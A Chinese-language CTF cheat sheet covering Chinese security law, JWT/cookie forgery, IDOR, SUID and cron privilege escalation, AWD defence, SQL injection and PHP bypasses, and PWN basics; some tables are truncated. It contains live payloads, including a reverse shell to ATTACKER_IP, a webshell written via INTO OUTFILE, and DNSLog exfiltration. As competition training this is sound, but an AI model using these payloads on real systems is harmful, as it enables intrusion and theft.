### 三大核心法律

#### 1. 《网络安全法》（2017年6月1日施行）

| 考点 | 内容 |
|------|------|
| 网络运营者义务 | 保障网络安全、个人信息保护、数据留存配合调查 |
| 关键信息基础设施 | 能源、金融、交通、水利、公共服务等领域 |
| 个人信息保护原则 | 合法、正当、必要；明示同意 |
| 网络安全等级保护 | 五级保护制度（一级最低，五级最高）|
| 数据留存 | 网络日志不少于六个月 |
| 应急处置 | 立即启动预案，采取补救措施，报告主管部门 |
| 法律责任 | 违反可处 1万-100万元罚款，吊销许可证 |

**高频选择题目**：

- 网络运营者收集使用个人信息应遵循什么原则？→ 合法、正当、必要
- 网络日志留存期限不少于多少？→ 六个月
- 等级保护制度最高级别？→ 五级（专控保护级）
- 个人信息删除条件？→ 用户撤回同意或不再必要

#### 2. 《数据安全法》（2021年9月1日施行）

| 考点 | 内容 |
|------|------|
| 数据分类 | 一般数据 / 重要数据 / 核心数据 |
| 数据安全等级 | 一般保护 / 加强保护 / 严格保护 |
| 数据出境 | 重要数据出境需安全评估 |
| 主管部门 | 国家网信部门负责统筹协调 |
| 跨境调取数据 | 非经主管机关批准，不得向外国司法/执法机构提供 |

#### 3. 《个人信息保护法》（2021年11月1日施行）

| 考点 | 内容 |
|------|------|
| 适用范围 | 在境内处理自然人个人信息（含境外向境内提供）|
| 处理原则 | 合法、正当、必要、诚信 |
| 知情同意 | 处理前以显著方式告知，取得同意 |

| 大型平台 | 基础性互联网平台服务需成立独立机构监督 |
| 罚款 | 违规可处 5000万以下或上年度营业额 5% 以下 |

## 认证与会话绕过

> CTF 中极高频考点，涉及身份伪造和逻辑漏洞

### JWT（JSON Web Token）利用

JWT 结构：`Header.Payload.Signature`，三段 Base64URL 编码。

**常见利用方式**：

| 攻击方式 | 原理 | 方法 |
|---------|------|------|
| `alg: none` | 签名算法改为 none | Header 改 `{"alg":"none"}`，删除签名段 |
| HS256 密钥爆破 | 弱密钥可离线爆破 | jwt_tool / hashcat -m 16500 |
| RS256 → HS256 降级 | 公钥可做 HMAC 密钥 | 用公钥做 HS256 签名 |
| kid 注入 | kid 参数控制密钥路径 | kid 指向已知文件或目录穿越 |
| 敏感信息泄露 | Payload 明文存储 | 直接 Base64 解码查看 |

```python
# JWT 解码
import base64, json

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.xxx"
parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
print(f"Header: {header}")
print(f"Payload: {payload}")

# alg:none 改造
import base64
header_none = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=').decode()
payload_admin = base64.urlsafe_b64encode(b'{"user":"admin","role":"admin"}').rstrip(b'=').decode()
forged = f"{header_none}.{payload_admin}."
print(f"Forged: {forged}")
```

竞赛技巧：先解码看 Payload 里有什么字段，把 role/user/is_admin 改成特权值再尝试 none 签名。如果不行，用 `jwt_tool` 爆破 HS256 密钥。

### Session 与 Cookie 利用

**Session 固定**：服务器不改变 Session ID，攻击者预设一个 Session ID 给受害者。

**Session 预测**：Session ID 规律简单（如递增数字），可猜解其他用户会话。

**Cookie 伪造**：

```python
# 常见 Cookie 结构
# Flask: session=eyJ1c2VyIjoiYWRtaW4ifQ.JsonSignature
# 解码后: {"user":"admin"}

# Flask session 解码（不需要密钥）
import zlib, base64, json
def decode_flask_cookie(cookie):
    payload = cookie.split('.')[0]
    # 去掉 . 前缀
    if payload.startswith('.'):
        payload = payload[1:]
    data = base64.b64decode(payload)
    # 尝试解压
    try:
        data = zlib.decompress(data)
    except:
        pass
    return data

# Flask session 伪造（需要 SECRET_KEY）
# 使用 flask-unsign 工具
# flask-unsign --decode --cookie 'eyJ...'
# flask-unsign --sign --cookie '{"user":"admin"}' --secret 'secret_key'
```

竞赛高频场景：

- Flask SECRET_KEY 泄露（ config / debug 页面 / 源码）→ 伪造 session 提权
- PHP Session 文件路径已知 → 配合文件包含利用
- Cookie 中 `is_admin=0` → 改为 `1`（未做服务端校验）

### 越权访问（IDOR）

IDOR（Insecure Direct Object Reference）是 CTF 最高频的逻辑漏洞之一。

```http
# 水平越权：修改用户 ID 访问他人数据
GET /api/user/1001 → 改为 /api/user/1002

# 垂直越权：普通用户访问管理接口
POST /admin/deleteUser （只用普通用户 Cookie）

# 常见参数篡改点
?uid=  &id=  /user/  /order/  /file?id=
Cookie: role=user → role=admin
```

竞赛技巧：用 BurpSuite Intruder 遍历 ID 字段，关注响应长度和状态码变化。批量扫一下 `/api/user/1` 到 `/api/user/999`，不同长度往往意味着找到其他用户数据。

### OAuth / SSO 配置缺陷

| 缺陷类型 | 利用方式 |

### SUID 提权

SUID（Set User ID）程序以文件所有者权限执行，若所有者是 root 且程序可执行命令，则可提权。

```bash
# 查找 SUID 文件
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
```

常见可利用 SUID 程序（GTFOBins）：

| 程序 | 提权方式 |
|------|---------|
| `find` | `find . -exec /bin/sh -p \;` |
| `vim` | `vim -c ':!/bin/sh'` |
| `python` | `python -c 'import os; os.system("/bin/sh")'` |
| `perl` | `perl -e 'exec "/bin/sh"'` |
| `nmap`（旧版） | `nmap --interactive` → `!sh` |
| `cp` | 覆盖 `/etc/passwd` |
| `env` | `env /bin/sh -p` |
| `bash` | `bash -p` |
| `less/more` | `!/bin/sh` |
| `tar` | `tar cf /dev/null test --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `chmod` | 改关键文件权限 |
| `wget/curl` | 下载覆盖系统文件 |

竞赛技巧：查到 SUID 程序后去 GTFOBins（https://gtfobins.github.io）搜索对应程序名，有详细利用方法。

### Cron 任务利用

```bash
# 查看 cron 任务
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
cat /var/log/cron 2>/dev/null   # 日志

# 查找以 root 运行的定时脚本
grep -rn "*" /etc/cron* 2>/dev/null
```

利用场景：

1. **定时脚本可写**：cron 以 root 运行的脚本可被当前用户写入 → 加入反弹终端命令
2. **PATH 劫持**：cron 脚本调用无路径程序（如 `backup.sh` 调用 `tar`），修改 `$PATH` 使其先找到恶意 `tar`
3. **通配符注入**：cron 用 `tar cf backup.tar *` 时，在目录下创建文件名含 `--checkpoint-action=exec=sh` 的文件

```bash
# 通配符注入示例
# 假设 root cron 执行: cd /home/user/backup && tar czf /tmp/backup.tar.gz *
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=bash shell.sh"
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" > shell.sh
# 等待 cron 执行即可
```

## AWD 攻防策略

> AWD（Attack With Defense）是 CTF 竞赛中独特的攻防对抗模式

### 赛前准备清单

| 准备项 | 内容 |
|-------|------|
| 脚本框架 | 批量拿_flag / 批量提交 / 自动修补脚本骨架 |
| WAF 规则 | 准备通用 WAF（SQL/XSS/RCE 等过滤） |
| 后门查杀 | 扫码工具 + 手动排查 checklist |
| 备份策略 | 源码备份 + 数据库备份 + 定时自动备份 |
| 监控方案 | 流量抓取脚本，记录所有入站请求 |

### 开局标准流程

```
1. 登录SSH → 立即备份源码和数据库
2. 修改SSH密码 → 改复杂密码
3. 部署WAF → 过滤恶意请求
4. 审计源码 → 找后门 + 找漏洞
5. 修补已知漏洞 → 堵住入站点
6. 编写利用脚本 → 批量拿其他队伍flag
7. 持续监控流量 → 发现新利用方式
```

### 源码审计顺序（快速定位漏洞）

```
1. grep 危险函数: system/exec/eval/passthru/shell_exec/popen
2. grep SQL拼接: query/query_sql/mysql_query (看是否参数化)
3. grep 文件操作: include/require/fopen/readfile (看是否可控)
4. grep 反序列化: unserialize (看是否可控)
5. 找隐藏后门: 搜索 eval(base64_decode / assert / preg_replace.*e
```

```bash
# 快速找后门
grep -rn "eval\|assert\|system\|exec\|passthru\|shell_exec\|popen" /var/www/html/ --include="*.php" | grep -v vendor
grep -rn "base64_decode\|gzinflate\|gzuncompress\|str_rot13\|strrev" /var/www/html/ --include="*.php"
# 搜索混淆代码特征
grep -rn '\$_[A-Z0-9]*\[' /var/www/html/ --include="*.php"
```

### WAF 部署

```php
// PHP 通用 WAF（放到入口文件顶部或 php.ini auto_prepend_file）
<?php
$blacklist = array(
    'select', 'union', 'insert', 'update', 'delete', 'drop',
    'load_file', 'outfile', 'into',
    'eval', 'assert', 'system', 'exec', 'passthru', 'shell_exec',
    'popen', 'proc_open', 'pcntl_exec',
    'base64_decode',
);
foreach ($_GET as $key => $value) {
    $v = strtolower($value);
    foreach ($blacklist as $word) {
        if (strpos($v, $word) !== false) {
            exit('Blocked');
        }
    }
}
// 同理过滤 $_POST $_COOKIE $_SERVER['QUERY_STRING']
?>
```

### 流量抓取与复用

```php
// 流量录制（写入文件记录所有请求）
<?php
$log = date('H:i:s') . ' ' . $_SERVER['REMOTE_ADDR'] . ' ' . 
       $_SERVER['REQUEST_METHOD'] . ' ' . $_SERVER['REQUEST_URI'] . "\n";
if ($_POST) $log .= 'POST: ' . http_build_query($_POST) . "\n";
file_put_contents('/tmp/traffic.log', $log, FILE_APPEND);
?>
```

竞赛技巧：抓到其他队伍的利用载荷后，可以直接复用来拿同样的 flag，省去自己审计源码的时间。

## 综合渗透实战方法论

> 非具体技术点，而是竞赛中从信息收集到拿 flag 的完整思维链

### 渗透测试标准流程

```
信息收集 → 漏洞发现 → 漏洞利用 → 权限提升 → 持久化 → 痕迹清理
```

### CTF 渗透题常见题型与套路

| 题型 | 套路 |
|------|------|
| Web 入口拿 flag | 信息收集 → 目录挖掘 → 找到漏洞点 → 直接 RCE 或文件读取 flag |
| 多层渗透 | Web → 拿终端 → 提权 → 读内网 flag |
| AWD | 开局防御 → 审计源码 → 批量利用 → 持续监控 |
| 综合靶场 | 多服务多端口 → 逐个突破 → 横向移动 → 找最终 flag |
| 红蓝对抗 | 攻击链规划 → 隐蔽行动 → 蓝队规则规避 |

### 时间管理策略

竞赛时间有限，按优先级分配：

1. **先扫后打**：用 10 分钟完成全部信息收集（端口/目录/指纹），不要一上来就手动猜
2. **先易后难**：先尝试简单漏洞（弱口令/默认配置/未授权），再深入审计代码
3. **边打边记**：发现的每个可利用点立即记录，避免重复劳动
4. **关注提示**：题目描述、注释、非标端口名往往有明确提示

### 常见突破口优先级

从成功率高到低排序：

| 优先级 | 突破点 | 成功率 | 耗时 |
|--------|--------|--------|------|
| 1 | 弱口令/默认密码 | 高 | 低 |
| 2 | 已知 CMS/框架漏洞 | 高 | 低 |
| 3 | 备份文件/源码泄露 | 中 | 低 |
| 4 | 未授权访问接口 | 中 | 中 |
| 5 | SQL 注入 | 中 | 中 |
| 6 | 文件上传 | 中 | 中 |
| 7 | RCE 漏洞 | 低 | 高 |
| 8 | 逻辑漏洞/越权 | 低 | 高 |
| 9 | 组利用（链式） | 低 | 高 |

### 常见误区

1. **过度依赖工具**：sqlmap 跑不出来不代表没注入，手动构造可能更快
2. **忽略 HTTP 响应头**：Server / X-Powered-By / Set-Cookie 中有关键信息
3. **只看 Web 不看服务**：FTP/SSH/Redis/SMB 等服务也是常见入口
4. **忘记 flag 位置**：除了 `/flag`，还可能在环境变量(`env`)、数据库、文件系统其他位置、内存中
5. **不读题目描述**：很多题目描述中直接给了提示（如"管理员密码是6位数字"）

| 位置 | 命令 |

| 根目录文件 | `cat /flag* /root/flag* /home/*/flag*` |

## PHP 技巧

### 弱类型比较

- `"0e12345" == "0e54321"` 为 `true`（科学计数法字符串比较，PHP 认为都是 0）
- `"0e12345" == 0` 为 `true`（字符串以数字开头转 int）
- `[] == ""` 为 `false`，但 `[] == 0` 为 `false`，`[] == NULL` 为 `true`
- `"admin" == 0` 为 `true`（字符串与数字比较，PHP 8+ 已改为 false）
- `"1" == "01"` 为 `true`，`"10" == "1e1"` 为 `true`
- `switch` 语句也是弱类型比较，`switch("2abc")` 会匹配 `case 2`

### sha1 / md5 数组绕过

```php
sha1([]) === NULL       // 数组传给 sha1 返回 NULL
md5([])  === NULL       // 同理
sha1([]) === sha1([])   // NULL === NULL → true
```

- 题目模式：`if(sha1($a) === sha1($b) && $a !== $b)` → 传 `a[]=1&b[]=2`
- `==` 比较时找 MD5 碰撞：`0e开头` 的字符串（如 `240610708` → md5 = `0e462097...`）
- `===` 比较时用数组绕过，或找真正的 MD5 碰撞对（`aaroZmOk` / `aaO8zKZF`）

###preg_match / preg_replace

- `preg_match` 处理超大字符串时返回 `false`（非 1 或 0），可绕过 `if(preg_match(...))` 校验
- 构造超长字符串：`str_repeat('a', 1000000)` 让 `preg_match` 回溯溢出返回 false
- `preg_replace` 的 `/e` 修饰符（PHP < 7）：替换字符串会作为 PHP 代码执行
- `preg_match` 正则可被换行绕过：`^admin$` 不匹配 `admin\n`（需用 `$/m` 或 `\z`）

### PHP 伪协议

| 协议 | 用途 | 常见场景 |
|------|------|---------|
| `php://filter` | 读源码 | `php://filter/read=convert.base64-encode/resource=index.php` |
| `php://input` | 读 POST 原始 body | 配合 `file_get_contents($input)` 或 `require` |
| `data://` | 内联数据 | `data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+` |
| `phar://` | phar 文件访问 | 配合反序列化利用（见下方） |
| `zip://` | zip 内文件读取 | `zip://uploads/shell.zip%23shell.php` |
| `expect://` | 命令执行 | 需安装 expect 扩展 |

### PHP 变量覆盖

```php
// extract() 直接将数组键变为变量
extract($_GET);     // ?auth=1 → $auth = 1

// $$ 可变变量
$$key = $value;     // 可覆盖任意变量

// parse_str 不加第二参数
parse_str($query);  // a=1&b=2 → $a=1, $b=2
```

### intval 截断

- `intval("1024abc")` → `1024`（截断非数字部分）
- `intval("0x1a")` → `0`（PHP 7+ 不识别十六进制字符串，需 `intval("0x1a", 16)` 或 `+0x1a`）
- `intval("1e3")` → `1`（不解析科学计数法字符串）
- 但 `"1e3" == 1000` 在 PHP 7 以下为 `true`

### 其他 PHP 偏门

- `in_array("1abc", [0,1,2])` → `true`（弱类型匹配，PHP 8+ 修复）

- `@` 错误抑制符不影响后续代码，但会吃掉错误信息（调试时去掉）

## SQL 注入技巧

### 注入点快速判断

- 数字型：`id=1 and 1=1` vs `id=1 and 1=2`（页面是否变化）
- 字符型：`id=1' and '1'='1` vs `id=1' and '1'='2`
- 万能密码：`admin' or 1=1#` / `admin' or 1=1--` / `admin" or 1=1#`
- 编码绕过单引号：`%bf%27`（GBK 多字节绕过 addslashes）

### MySQL 高频技巧

- `GROUP_CONCAT` 一次性提取所有表名/列名，避免逐条
  ```sql
  UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()
  ```
- `INTO OUTFILE` 写 Webshell：`UNION SELECT '<?php eval($_POST[0]);?>' INTO OUTFILE '/var/www/html/shell.php'`
  - 需 `secure_file_priv` 为空或包含目标路径
- 注释符：`-- ` / `#` / `/**/` / `;` （分号堆叠）
- 过滤空格：`/**/` / `%09`(Tab) / `%0a`(换行) / `()` 括号包裹
- 过滤 `UNION`：`UNunionION` 双写绕过（过滤一次后拼接还原）
- 过滤逗号：`UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b` 截取不用逗号
- 过滤 `AND/OR`：`&&` / `||` / `XOR`
- `hex()` 绕过引号：`WHERE name=0x61646D696E`（`admin` 的 hex）

### SQLite 特有

- SQLite 没有 `information_schema`，表信息在 `sqlite_master`
  ```sql
  SELECT name,sql FROM sqlite_master WHERE type='table'
  ```
- SQLite 不支持 `INTO OUTFILE`
- `||` 是字符串拼接（MySQL 中是 OR）

### 堆叠注入

- MySQL 默认 `mysqli_query` 只执行第一条，但 `PDO::MYSQL_ATTR_MULTI_STATEMENTS` 允许多条
- 遇到过滤 union 无法回显时，堆叠注入可直接执行 `SET` / `PREPARE` 绕过
  ```sql
  id=1;SET @sql=CONCAT('sel','ect * from flag');PREPARE stmt FROM @sql;EXECUTE stmt
  ```

### 无回显注入

- 布尔盲注：二分搜索逐字符提取 `ASCII(SUBSTR((SELECT flag),1,1)) > 50`
- 时间盲注：`IF(ASCII(SUBSTR(...))>50, SLEEP(2), 0)` 看响应时间
- DNSLog 外带（MySQL）：`SELECT LOAD_FILE(CONCAT('\\\\',(SELECT flag),'.xxx.dnslog.cn\\abc'))`
  - 仅 Windows 上 `LOAD_FILE` 支持 UNC 路径

## 密码学小技巧

### 编码识别速查

| 特征 | 编码 | 说明 |
|------|------|------|
| `=` 或 `==` 结尾 | Base64 | 大小写字母+数字+/+ |
| `-` / `_` 替换 +/ | Base64URL | URL 安全变体 |
| 全大写字母+数字 | Base32 | A-Z + 2-7，8 字节对齐 |
| `~` `!` 或自定义字符集 | Base85/Ascii85 | 高密度编码 |
| `%XX` | URL 编码 | 十六进制 |
| `\x` 前缀 | 十六进制 | `\x41` = 'A' |
| `&#数字;` | HTML 实体 | `&#65;` = 'A' |
| 全 `0-7` | 八进制 | |
| 可见但乱码 | Base 编码套娃 | 多层解码 |

### RSA 常见特征快速判断

- `n` 很小（< 256 bit）→ 直接分解（factordb.com）
- `e=1` → 密文 = 明文
- `e` 很大 → `d` 很小，Wiener 攻击
- `n1` 和 `n2` 有公因数 → 共模，直接 GCD
- 同一 `n` 同一密文不同 `e` → 共模攻击
- 给了 `dp` 或 `dq` → 泄露利用
- 密文有规律、且明文有 padding → Padding Oracle

### 古典密码快速识别

| 特征 | 可能的密码 |
|------|-----------|
| 字母频率符合英语但乱序 | 置换密码 |
| 高频字母变为特定字母 | 凯撒/仿射 |
| 多字母分组密文 | 维吉尼亚（卡西斯基试验） |
| 棋盘格 1-5 数字 | 波利比奥斯方阵 |
| 只有两个字符 | 摩斯/Bacon/二进制 |
| 出现 `(` `)` 且分层 | 栅栏/栅栏嵌套 |

## PWN 小技巧

### checksec 速读

| 保护 | 含义 | 绕过思路 |
|------|------|---------|
| RELRO | GOT 表可写性 | Full RELRO → 不能改 GOT |
| Stack Canary | 栈溢出检测 | 泄露 canary / 格式化字符串读 |
| NX | 栈不可执行 | ret2libc / ROP |
| PIE | 地址随机化 | 泄露基址 |

### 一句话判断利用方向

- 无 Canary + 无 NX → 栈溢出 + shellcode（栈上执行）
- 无 Canary + NX → ret2libc / ROP
- 有 Canary + NX → 泄露 canary + ret2libc
- 有格式化字符串 → 任意读写，直接改 GOT / 返回地址
- 有 `system` 函数 → 栈溢出直接 `system("/bin/sh")`
- 有 `__int80` 或 `syscall` → SROP 或 ret2syscall

### 常用 one_gadget

```bash
# 查找 libc 中的 one_gadget
one_gadget libc.so.6
# 输出类似：
# 0x4527a execve("/bin/sh", rsp+0x30, environ)
#   constraints: rax == NULL
```

竞赛技巧：栈溢出长度不够构造完整 ROP 时，跳到 one_gadget 一条链拿终端。
